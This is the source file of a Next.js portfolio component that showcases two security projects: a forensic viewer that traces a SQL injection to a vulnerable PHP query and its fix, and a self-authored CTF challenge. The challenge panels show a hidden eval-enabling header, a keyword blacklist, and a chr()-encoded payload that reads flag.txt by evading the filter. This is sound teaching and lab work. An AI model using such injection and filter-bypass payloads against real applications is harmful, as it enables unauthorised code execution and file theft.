"use client";

import Image from "next/image";
import { Showcase } from "./Showcase";

/* Screenshots captured from my own local runs (see public/cases). */

function Tagged({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <figure className="relative overflow-hidden rounded-lg border border-white/10 shadow-[0_30px_70px_-20px_rgba(0,0,0,0.6)]">
      {children}
      <figcaption className="absolute top-2 right-2 rounded bg-accent px-1.5 py-0.5 font-mono text-[0.6rem] tracking-[0.06em] text-white uppercase">
        {label}
      </figcaption>
    </figure>
  );
}

function CodeCard({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="overflow-hidden rounded-lg border border-white/10 bg-[#0d1117] shadow-[0_30px_70px_-20px_rgba(0,0,0,0.6)]">
      <div className="flex items-center justify-between border-b border-white/10 px-3 py-1.5">
        <span className="font-mono text-[0.62rem] tracking-[0.06em] text-white/45 uppercase">{title}</span>
        <span className="h-1.5 w-1.5 rounded-full bg-accent" />
      </div>
      <pre className="px-4 py-3 font-mono text-[0.74rem] leading-[1.7] whitespace-pre text-white/80">{children}</pre>
    </div>
  );
}

const hi = "rounded-sm bg-accent/25 px-0.5 text-[#ff9b7a]";

export function WebforensicsShowcase() {
  return (
    <Showcase
      windowTitle="viewer.html · case WF-E887DEB66B · offline"
      footnote="Captured from my own run on lab scenario F · switch the theme in the window bar"
      views={[
        {
          id: "chain",
          tab: "Evidence chain",
          title: "One sentence verdict, then every step back to the entry point.",
          note: "Each step cites a log line or file hash. Line weight on the left shows how strong that evidence is.",
          src: { dark: "/cases/wf-chain-dark.webp", light: "/cases/wf-chain-light.webp" },
        },
        {
          id: "inspect",
          tab: "Timeline",
          title: "One lane per actor, with the root cause marked on the chart.",
          note: "Selecting an event opens its confidence notes, its ATT&CK phase and the raw log line it came from.",
          src: { dark: "/cases/wf-inspect-dark.webp", light: "/cases/wf-inspect-light.webp" },
        },
        {
          id: "root",
          tab: "Root cause",
          title: "The vulnerable PHP line, next to the prepared-statement fix.",
          note: "The payload is decoded from the request, and the variables pasted straight into the query are marked.",
          src: { dark: "/cases/wf-root-dark.webp", light: "/cases/wf-root-light.webp" },
        },
      ]}
      floats={[
        {
          className: "-bottom-10 -left-6 w-[34%] xl:-left-14",
          drift: [120, -120],
          node: (
            <Tagged label="Payload, decoded">
              <Image src="/cases/wf-detail-payload.webp" alt="Decoded SQL injection payload" width={1134} height={410} className="w-full" />
            </Tagged>
          ),
        },
        {
          className: "-right-6 top-[18%] w-[40%] xl:-right-14",
          drift: [60, -180],
          node: (
            <Tagged label="Line 13 → fix">
              <Image src="/cases/wf-detail-fix.webp" alt="Vulnerable query and its prepared-statement fix" width={1462} height={460} className="w-full" />
            </Tagged>
          ),
        },
      ]}
    />
  );
}

export function RegistryShowcase() {
  return (
    <Showcase
      windowTitle="registry · lab-assistant sign-up · localhost"
      chrome="#161616"
      footnote="Solved again on my own machine from the challenge source · CSC CTF Contest 2026"
      views={[
        {
          id: "echo",
          tab: "Echo",
          title: "Without the header, the bio is only echoed back.",
          note: "A comment in the page source brags about two layers of protection, which is the first hint that something else is listening.",
          src: "/cases/reg-2-echo.webp",
          bg: "#f8f9fa",
        },
        {
          id: "eval",
          tab: "Header",
          title: "One hidden header turns the bio into Python.",
          note: "Sending X-Activate-Eval: true flips the session into eval mode, so 7*7 comes back as 49.",
          src: "/cases/reg-3-eval.webp",
          bg: "#000",
        },
        {
          id: "blocked",
          tab: "Filter",
          title: "The obvious payload trips the regex.",
          note: "open('flag.txt') is caught on the file extension. A keyword blacklist also stops os, exec, socket and friends.",
          src: "/cases/reg-4-blocked.webp",
          bg: "#000",
        },
        {
          id: "bypass",
          tab: "Bypass",
          title: "chr() rebuilds the filename one character at a time.",
          note: "The string flag.txt never appears in the request, so neither filter has anything to match.",
          src: "/cases/reg-1-payload.webp",
          bg: "#f8f9fa",
        },
        {
          id: "flag",
          tab: "Flag",
          title: "The file is read and printed in the terminal.",
          note: "The intended path, end to end. Any other way in would have been a bug in my challenge.",
          src: "/cases/reg-5-flag.webp",
          bg: "#000",
        },
      ]}
      floats={[
        {
          className: "-bottom-12 -left-6 w-[38%] xl:-left-14",
          drift: [110, -130],
          node: (
            <CodeCard title="Request · intercepted">
              <span className="text-white">POST</span> /update-profile HTTP/1.1{"\n"}
              Host: localhost:5055{"\n"}
              <span className={hi}>X-Activate-Eval: true</span>
              {"\n"}
              Content-Type: application/x-www-form-urlencoded{"\n\n"}
              name=Dhio&amp;nim=2026&amp;ipk=4.00&amp;bio=<span className={hi}>7*7</span>
            </CodeCard>
          ),
        },
        {
          className: "-right-6 top-[14%] w-[40%] xl:-right-14",
          drift: [70, -170],
          node: (
            <CodeCard title="Payload · bio field">
              <span className="text-white/45"># &quot;flag.txt&quot; without writing it</span>
              {"\n"}open(join([<span className={hi}>chr</span>(x) for x in{"\n"}
              {"  "}[102,108,97,103,46,116,120,116]])).read()
            </CodeCard>
          ),
        },
      ]}
    />
  );
}
